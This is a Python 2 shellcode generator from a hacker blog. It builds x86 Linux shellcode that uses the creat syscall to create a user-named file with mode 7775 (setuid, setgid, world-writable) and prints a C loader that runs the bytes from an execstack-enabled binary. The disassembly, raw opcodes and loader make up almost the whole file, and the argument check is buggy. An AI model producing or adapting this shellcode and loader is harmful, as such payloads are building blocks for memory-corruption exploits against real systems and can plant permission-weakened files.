#!/bin/python
from sys import argv

"""
Shellcode Generator...
Create file with permission 7775

---------------------------------------------------------------------------------
Disassembly of section .text:

08048060 <.text>:
 8048060:	eb 12                	jmp    0x8048074
 8048062:	5b                   	pop    %ebx
 8048063:	31 c0                	xor    %eax,%eax
 8048065:	88 43 05             	mov    %al,0x5(%ebx)
 8048068:	b0 08                	mov    $0x8,%al
 804806a:	b1 ff                	mov    $0xff,%cl
 804806c:	b5 ff                	mov    $0xff,%ch
 804806e:	cd 80                	int    $0x80
 8048070:	b0 01                	mov    $0x1,%al
 8048072:	cd 80                	int    $0x80
 8048074:	e8 e9 ff ff ff       	call   0x8048062
 8048079:	61                   	popa
 804807a:	6a 69                	push   $0x69
 804807c:	74 68                	je     0x80480e6
 804807e:	23                   	.byte 0x23
 ---------------------------------------------------------------------------------
 b4ck 2 h4ck --- Ajith Kp [@ajithkp560] --- http://www.terminalcoders.blogspot.com

 Om Asato Maa Sad-Gamaya |
 Tamaso Maa Jyotir-Gamaya |
 Mrtyor-Maa Amrtam Gamaya |
 Om Shaantih Shaantih Shaantih |
"""

bann3r = '''
/*
    [][][][][][][][][][][][][][][][][][][][][][][]
    []                                          []
    []      c0d3d by Ajith Kp [ajithkp560]      []
    []   http://www.terminalcoders.blogspot.in  []
    []                                          []
    [][][][][][][][][][][][][][][][][][][][][][][]
*/
'''
sh3ll = "\\xeb\\x12\\x5b\\x31\\xc0\\x88\\x43"
sh311 ="\\xb0\\x08\\xb1\\xff\\xb5\\xff\\xcd\\x80\\xb0\\x01\\xcd\\x80\\xe8\\xe9\\xff\\xff\\xff"
print bann3r
if len(argv)<1:
    print 'Usage: '+argv[0]+' name_of_file'
else:
    fil3 = argv[1]
    h3x = ''
    for i in range(len(fil3)):
        h3x+=str('\\'+hex(ord(fil3[i]))[1:])
    h3x+=str('\\' + 'x23')
    l3n = '\\x'+hex((len(fil3)))[2:].zfill(2)
    sh = str(sh3ll) + str(l3n) + str(sh311) + str(h3x)
    print '// Compile with'
    print '// $ gcc -o output source.c'
    print '// $ execstack -s output'
    print '// $ ./output'
    print '////////////////////////////////////////////\n'
    print '# include <stdio.h>'
    print 'char sh[] = "'+sh+'";'
    print 'main(int argc, char **argv)'
    print '''{
            int (*func)();
            func = (int (*)()) sh;
            (int)(*func)();'''
    print '}'
    print '\n////////////////////////////////////////////'